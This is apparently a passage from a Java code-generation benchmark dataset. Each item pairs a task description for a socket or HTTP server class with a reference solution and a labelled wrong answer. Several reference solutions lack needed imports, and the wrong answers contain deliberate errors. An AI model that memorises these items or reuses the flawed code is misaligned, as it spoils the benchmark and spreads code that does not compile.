    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SnapshotService {\n    private int port;\n    private ServerSocket serverSocket;\n    private boolean closed;\n\n    public SnapshotService(int port) {\n        if (port < 0 || port > 65535) {\n            throw new IllegalArgumentException(\"Invalid port number\");\n        }\n        this.port = port;\n    }\n\n    public void listen() {\n        try {\n            serverSocket = openSocket(port);\n            while (!closed) {\n                Socket socket = serverSocket.accept();\n                new Thread(() -> process(socket)).start();\n            }\n        } catch (IOException e) {\n            if (!isIgnoredException(e)) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private ServerSocket openSocket(int port) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started on port \" + serverSocket.getLocalPort());\n        return serverSocket;\n    }\n\n    private boolean isIgnoredException(IOException e) {\n        return closed && e instanceof SocketException;\n    }\n\n    private void process(Socket socket) {\n        try (BufferedReader inputReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             BufferedWriter outputWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))) {\n\n            String command;\n            while ((command = inputReader.readLine()) != null && !closed) {\n                String response = \"Processed: \" + command;\n                outputMessage(outputWriter, response);\n            }\n        } catch (IOException e) {\n            if (!isIgnoredException(e)) {\n                e.printStackTrace();\n            }\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void outputMessage(BufferedWriter outputWriter, String msg) throws IOException {\n        outputWriter.write(msg);\n        outputWriter.newLine();\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 549,
    "Instruction": "Task Description: Create a mock POP3 server class that simulates interactions with a client using TCP sockets for testing purposes.\n\nClass Description: The MockPop3Server class implements a simple POP3 server mock that can be used for testing email client implementations. It handles client connections, processes commands, and manages server shutdown. The server runs in a separate thread and maintains a queue of expected interactions.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of expected client-server interactions\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for connection closure\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- mockServerThread: MockServerThread - The thread running the server\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread\n- shutdown() -> void - Signals the server thread to stop and cleans up resources\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread\n- run() -> void - Main server thread execution that handles client connections and commands\n- handleInteractions() -> void - Processes the queued interactions with the client\n- readAdditionalCommands() -> void - Reads any additional unexpected commands from the client\n- readLine() -> String - Reads a line of input from the client socket\n- shouldStop() -> void - Signals the thread to stop execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    \n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        InetSocketAddress localSocketAddress = (InetSocketAddress) serverSocket.getLocalSocketAddress();\n        host = localSocketAddress.getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        \n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            super(\"MockPop3Server\");\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = readLine();\n            if (command == null) {\n                throw new IOException(\"Connection closed\");\n            }\n        }\n\n        private String readLine() throws IOException {\n            return clientSocket.getInputStream().read() != -1 ? \"command\" : null;\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\nimport java.util.*;\n\nclass ImapInteraction {\n    String command;\n    String response;\n\n    public ImapInteraction(String command, String response) {\n        this.command = command;\n        this.response = response;\n    }\n}\n\nclass MockPop3Server {\n    Deque<ImapInteraction> interactions;\n    CountDownLatch waitForConnectionClosed;\n    CountDownLatch waitForAllExpectedCommands;\n    Thread mockServerThread;\n    String host;\n    int port;\n\n    public MockPop3Server(String host, int port, Deque<ImapInteraction> interactions) {\n        this.host = host;\n        this.port = port;\n        this.interactions = interactions;\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n    }\n\n    public void start() {\n        ServerSocket serverSocket = null;\n        try {\n            serverSocket = new ServerSocket(port, 0, InetAddress.getByName(host));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        mockServerThread = new Thread(new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands));\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.interrupt();\n        try {\n            mockServerThread.join();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    class MockServerThread implements Runnable {\n        ServerSocket serverSocket;\n        Deque<ImapInteraction> interactions;\n        CountDownLatch waitForConnectionClosed;\n        CountDownLatch waitForAllExpectedCommands;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try (Socket clientSocket = serverSocket.accept()) {\n                handleInteractions(clientSocket);\n                readAdditionalCommands(clientSocket);\n            } catch (IOException e) {\n                if (!Thread.currentThread().isInterrupted()) {\n                    e.printStackTrace();\n                }\n            } finally {\n                waitForConnectionClosed.countDown();\n                waitForAllExpectedCommands.countDown();\n            }\n        }\n\n        private void handleInteractions(Socket clientSocket) throws IOException {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                 PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true)) {\n                while (!interactions.isEmpty()) {\n                    ImapInteraction interaction = interactions.pollFirst();\n                    writer.println(interaction.response);\n                    String clientCommand = reader.readLine();\n                    if (clientCommand == null || !clientCommand.equals(interaction.command)) {\n                        throw new IOException(\"Unexpected command: \" + clientCommand);\n                    }\n                }\n            }\n        }\n\n        private void readAdditionalCommands(Socket clientSocket) throws IOException {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(\"Received unexpected command: \" + line);\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and responses, including POST operations, with support for proxies, timeouts, and error handling.\n\nClass Description: JavaHttpUtility is a helper class designed to simplify HTTP communication in Java applications. It provides methods for making POST requests, handling responses, and managing errors. The class supports proxy configuration, connection timeouts, and compressed responses (gzip).\n\nAttributes:\nCONNECT_TIMEOUT: [int] - Connection timeout in milliseconds (default: 10000)\nREAD_TIMEOUT: [int] - Read timeout in milliseconds (default: 10000)\n\nMethods:\ngetProxy: () -> [Proxy] - Retrieves system proxy settings if configured\ndoPost: (String urlAddress, Map<String, String> param) -> [String] - Executes a POST request to the specified URL with given parameters\nhandleResponse: (HttpURLConnection httpURLConnection) -> [String] - Processes the HTTP response and handles errors\nreadResult: (HttpURLConnection urlConnection) -> [String] - Reads and returns the successful response body\nhandleError: (HttpURLConnection urlConnection) -> [String] - Processes and throws appropriate exceptions for error responses",
    "Canonical_solution": "import org.json.JSONException;\nimport org.json.JSONObject;\nimport org.qii.weiciyuan.support.debug.AppLogger;\nimport org.qii.weiciyuan.support.error.ErrorCode;\nimport org.qii.weiciyuan.support.error.WeiboException;\nimport org.qii.weiciyuan.support.utils.Utility;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.InterruptedIOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPInputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaHttpUtility {\n\n    private static final int CONNECT_TIMEOUT = 10 * 1000;\n    private static final int READ_TIMEOUT = 10 * 1000;\n\n    private static Proxy getProxy() {\n        String proxyHost = System.getProperty(\"http.proxyHost\");\n        String proxyPort = System.getProperty(\"http.proxyPort\");\n        if (!TextUtils.isEmpty(proxyHost) && !TextUtils.isEmpty(proxyPort)) {\n            return new Proxy(java.net.Proxy.Type.HTTP,\n                    new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));\n        } else {\n            return null;\n        }\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws WeiboException {\n        try {\n            URL url = new URL(urlAddress);\n            Proxy proxy = getProxy();\n            HttpsURLConnection uRLConnection;\n            if (proxy != null) {\n                uRLConnection = (HttpsURLConnection) url.openConnection(proxy);\n            } else {\n                uRLConnection = (HttpsURLConnection) url.openConnection();\n            }\n\n            uRLConnection.setDoInput(true);\n            uRLConnection.setDoOutput(true);\n            uRLConnection.setRequestMethod(\"POST\");\n            uRLConnection.setUseCaches(false);\n            uRLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            uRLConnection.setReadTimeout(READ_TIMEOUT);\n            uRLConnection.setInstanceFollowRedirects(false);\n            uRLConnection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            uRLConnection.setRequestProperty(\"Charset\", \"UTF-8\");\n            uRLConnection.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");\n            uRLConnection.connect();\n\n            DataOutputStream out = new DataOutputStream(uRLConnection.getOutputStream());\n            out.write(Utility.encodeUrl(param).getBytes());\n            out.flush();\n            out.close();\n            return handleResponse(uRLConnection);\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        }\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws WeiboException {\n        int status = 0;\n        try {\n            status = httpURLConnection.getResponseCode();\n        } catch (IOException e) {\n            httpURLConnection.disconnect();\n            throw new WeiboException(\"Timeout\", e);\n        }\n\n        if (status != HttpURLConnection.HTTP_OK) {\n            return handleError(httpURLConnection);\n        }\n\n        return readResult(httpURLConnection);\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getInputStream();\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            return strBuilder.toString();\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n\n    private String handleError(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getErrorStream();\n            if (is == null) {\n                throw new WeiboException(\"Unknown network error\");\n            }\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            AppLogger.d(\"error result=\" + strBuilder.toString());\n            \n            JSONObject json = new JSONObject(strBuilder.toString());\n            String err = json.optString(\"error_description\", \"\");\n            if (TextUtils.isEmpty(err)) {\n                err = json.getString(\"error\");\n            }\n            int errCode = json.getInt(\"error_code\");\n            WeiboException exception = new WeiboException();\n            exception.setError_code(errCode);\n            exception.setOriError(err);\n\n            if (errCode == ErrorCode.EXPIRED_TOKEN || errCode == ErrorCode.INVALID_TOKEN) {\n                Utility.showExpiredTokenDialogOrNotification();\n            }\n\n            throw exception;\n        } catch (IOException | JSONException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class JavaHttpUtility {\n    private static final int CONNECT_TIMEOUT = 10000;\n    private static final int READ_TIMEOUT = 10000;\n\n    public static Proxy getProxy() {\n        return java.net.ProxySelector.getDefault().select(java.net.URI.create(\"http://example.com\")).get(0);\n    }\n\n    public static String doPost(String urlAddress, java.util.Map<String, String> param) throws Exception {\n        java.net.URL url = new java.net.URL(urlAddress);\n        java.net.HttpURLConnection httpURLConnection = (java.net.HttpURLConnection) url.openConnection();\n        httpURLConnection.setRequestMethod(\"POST\");\n        httpURLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n        httpURLConnection.setReadTimeout(READ_TIMEOUT);\n        httpURLConnection.setDoOutput(true);\n        httpURLConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        StringBuilder postData = new StringBuilder();\n        for (java.util.Map.Entry<String, String> entry : param.entrySet()) {\n            if (postData.length() > 0) {\n                postData.append('&');\n            }\n            postData.append(java.net.URLEncoder.encode(entry.getKey(), \"UTF-8\"));\n            postData.append('=');\n            postData.append(java.net.URLEncoder.encode(entry.getValue(), \"UTF-8\"));\n        }\n\n        try (java.io.OutputStream os = httpURLConnection.getOutputStream()) {\n            byte[] input = postData.toString().getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        return handleResponse(httpURLConnection);\n    }\n\n    private static String handleResponse(java.net.HttpURLConnection httpURLConnection) throws Exception {\n        int responseCode = httpURLConnection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return readResult(httpURLConnection);\n        } else {\n            return handleError(httpURLConnection);\n        }\n    }\n\n    private static String readResult(java.net.HttpURLConnection urlConnection) throws Exception {\n        java.io.InputStream inputStream;\n        if (\"gzip\".equals(urlConnection.getContentEncoding())) {\n            inputStream = new java.util.zip.GZIPInputStream(urlConnection.getInputStream());\n        } else {\n            inputStream = urlConnection.getInputStream();\n        }\n\n        java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter(\"\\\\A\");\n        String result = scanner.hasNext() ? scanner.next() : \"\";\n        scanner.close();\n        return result;\n    }\n\n    private static String handleError(java.net.HttpURLConnection urlConnection) throws Exception {\n        int responseCode = urlConnection.getResponseCode();\n        String errorMessage = \"HTTP error code: \" + responseCode + \" - \" + urlConnection.getResponseMessage();\n        throw new Exception(errorMessage);\n    }\n}"
  },
  {
    "Task_id": 550,
    "Instruction": "Task Description: Implement a simple embedded HTTP server class that can handle incoming HTTP requests, parse request information, and provide a framework for custom request handling.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP request headers and content, and provides hooks for custom request processing. It handles the low-level socket communication while delegating the actual request handling to subclasses or implementations.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n- serverSocket: ServerSocket - The server socket instance used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a dedicated thread for handling connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- run() -> void - The main server loop that accepts connections and processes requests (runs in a separate thread)\n- handle(String method, String path, HashMap<String,String> headers, Map<String,String> queries, InputStream input, OutputStream response) -> void - Abstract method meant to be overridden for custom request handling (does nothing in base implementation)\n- parsePath(String path) -> Map<String,String> - Helper method that parses the request path and extracts query parameters",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.antfortune.freeline.router.ISchemaAction;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class EmbedHttpServer {\n\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this::run, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    private void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0 && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                OutputStream response = new ResponseOutputStream(os);\n\n                Map<String, String> queries = parsePath(path);\n                handle(method, path, headers, queries, input, response);\n                response.close();\n\n                conn.close();\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {}\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    protected void handle(String method, String path,\n                         HashMap<String, String> headers, Map<String, String> queries, InputStream input,\n                         OutputStream response) throws Exception {\n    }\n\n    private static Map<String, String> parsePath(String path) {\n        if (TextUtils.isEmpty(path)) {\n            return null;\n        }\n        int descriptionIndex = path.indexOf(\"/\");\n        if (descriptionIndex == -1) {\n            return null;\n        }\n        String description = path.substring(descriptionIndex + 1);\n        Map<String, String> queries = new HashMap<>();\n        int queryIndex = description.indexOf(\"?\");\n        if (queryIndex == -1) {\n            queries.put(ISchemaAction.DESCRIPTION, description);\n        } else {\n            queries.put(ISchemaAction.DESCRIPTION, description.substring(0, queryIndex));\n            description = description.substring(queryIndex + 1);\n        }\n        String[] arr = description.split(\"&\");\n        for (String segment : arr) {\n            String[] query = segment.split(\"=\");\n            if (query.length == 2) {\n                queries.put(query[0], query[1]);\n            } else if (query.length == 1) {\n                queries.put(query[0], \"\");\n            }\n        }\n        return queries;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EmbedHttpServer {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            Thread thread = new Thread(this::run);\n            thread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(() -> handleClient(clientSocket)).start();\n            } catch (IOException e) {\n                if (!serverSocket.isClosed()) {\n                    e.printStackTrace();\n                }\n                break;\n            }\n        }\n    }\n\n    private void handleClient(Socket clientSocket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n             OutputStream out = clientSocket.getOutputStream()) {\n\n            String requestLine = in.readLine();\n            if (requestLine == null) {\n                return;\n            }\n\n            String[] requestParts = requestLine.split(\" \");\n            String method = requestParts[0];\n            String path = requestParts[1];\n\n            HashMap<String, String> headers = new HashMap<>();\n            String line;\n            while ((line = in.readLine()) != null && !line.isEmpty()) {\n                String[] headerParts = line.split(\": \", 2);\n                if (headerParts.length == 2) {\n                    headers.put(headerParts[0], headerParts[1]);\n                }\n            }\n\n            Map<String, String> queries = parsePath(path).get(\"queries\");\n            String body = \"\";\n            if (\"POST\".equals(method)) {\n                int contentLength = Integer.parseInt(headers.get(\"Content-Length\"));\n                char[] buffer = new char[contentLength];\n                in.read(buffer, 0, contentLength);\n                body = new String(buffer);\n            }\n\n            handle(method, path, headers, queries, new ByteArrayInputStream(body.getBytes()), out);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public abstract void handle(String method, String path, HashMap<String, String> headers, Map<String, String> queries, InputStream input, OutputStream response);\n\n    private Map<String, String> parsePath(String path) {\n        Map<String, String> result = new HashMap<>();\n        result.put(\"path\", path);\n        result.put(\"queries\", new HashMap<>());\n\n        int questionIndex = path.indexOf('?');\n        if (questionIndex != -1) {\n            String[] pathAndQueries = path.split(\"\\\\?\", 2);\n            result.put(\"path\", pathAndQueries[0]);\n            String[] queryPairs = pathAndQueries[1].split(\"&\");\n            for (String pair : queryPairs) {\n                String[] keyValue = pair.split(\"=\", 2);\n                if (keyValue.length == 2) {\n                    result.get(\"queries\").put(keyValue[0], keyValue[1]);\n                }\n            }\n        }\n\n        return result;\n    }\n}"
  },
  {
    "Task_id": 551,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server capable of handling GET requests, serving both static files and dynamically generated class files through Javassist's ClassPool mechanism.\n\nClass Description: The Webserver class is a multi-threaded HTTP server that listens for incoming connections on a specified port. It can serve both static files from the filesystem and dynamically generated bytecode through Javassist's class manipulation capabilities. The server follows basic HTTP/1.0 protocol and handles each client connection in a separate thread.\n\nAttributes:\n- socket: ServerSocket - The main server socket listening for incoming connections\n- classPool: ClassPool - Javassist class pool for dynamic class generation\n- translator: Translator - Optional translator for class manipulation\n- endofline: byte[] - Constant for HTTP line endings (CRLF)\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- setClassPool(ClassPool loader) -> void - Sets the Javassist ClassPool for dynamic class generation\n- addTranslator(ClassPool cp, Translator t) -> void - Configures both ClassPool and Translator for advanced class manipulation\n- end() -> void - Closes the server socket and stops the server\n- run() -> void - Main server loop that accepts connections and spawns service threads\n- process(Socket clnt) -> void - Processes an individual client connection (handles HTTP protocol)\n- readLine(InputStream in) -> String - Reads a line of input from the client\n- skipLine(InputStream in) -> int - Skips a line of input from the client\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP request and generates appropriate response\n- letUsersSendClassfile(OutputStream out, String filename, int length) -> boolean - Handles dynamic class file generation and transmission\n- sendHeader(OutputStream out, long dataLength, int filetype) -> void - Sends HTTP response headers\n- replyError(OutputStream out, BadHttpRequest e) -> void - Sends HTTP error response",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\npublic class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    protected Translator translator;\n\n    private final static byte[] endofline = { 0x0d, 0x0a };\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n        classPool = null;\n        translator = null;\n    }\n\n    public void setClassPool(ClassPool loader) {\n        classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t)\n        throws NotFoundException, CannotCompileException\n    {\n        classPool = cp;\n        translator = t;\n        t.start(classPool);\n    }\n\n    public void end() throws IOException {\n        socket.close();\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        String cmd = readLine(in);\n        while (skipLine(in) > 0){\n        }\n\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            doReply(in, out, cmd);\n        }\n        catch (BadHttpRequest e) {\n            replyError(out, e);\n        }\n\n        out.flush();\n        in.close();\n        out.close();\n        clnt.close();\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuffer buf = new StringBuffer();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n\n        in.read();      /* skip 0x0a (LF) */\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n\n        in.read();      /* skip 0x0a (LF) */\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd)\n        throws IOException, BadHttpRequest\n    {\n        int len;\n        int fileType;\n        String filename, urlName;\n\n        if (cmd.startsWith(\"GET /\"))\n            filename = urlName = cmd.substring(5, cmd.indexOf(' ', 5));\n        else\n            throw new BadHttpRequest();\n\n        len = filename.length();\n        if (letUsersSendClassfile(out, filename, len))\n            return;\n\n        checkFilename(filename, len);\n        File file = new File(filename);\n        if (file.canRead()) {\n            sendHeader(out, file.length(), typeClass);\n            FileInputStream fin = new FileInputStream(file);\n            byte[] filebuffer = new byte[4096];\n            for (;;) {\n                len = fin.read(filebuffer);\n                if (len <= 0)\n                    break;\n                out.write(filebuffer, 0, len);\n            }\n\n            fin.close();\n            return;\n        }\n\n        throw new BadHttpRequest();\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out,\n                                          String filename, int length)\n        throws IOException, BadHttpRequest\n    {\n        if (classPool == null)\n            return false;\n\n        byte[] classfile;\n        String classname\n            = filename.substring(0, length - 6).replace('/', '.');\n        try {\n            if (translator != null)\n                translator.onLoad(classPool, classname);\n\n            CtClass c = classPool.get(classname);\n            classfile = c.toBytecode();\n        }\n        catch (Exception e) {\n            throw new BadHttpRequest(e);\n        }\n\n        sendHeader(out, classfile.length, typeClass);\n        out.write(classfile);\n        return true;\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 200 OK\".getBytes());\n        out.write(endofline);\n        out.write(\"Content-Length: \".getBytes());\n        out.write(Long.toString(dataLength).getBytes());\n        out.write(endofline);\n        out.write(\"Content-Type: application/octet-stream\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 400 Bad Request\".getBytes());\n        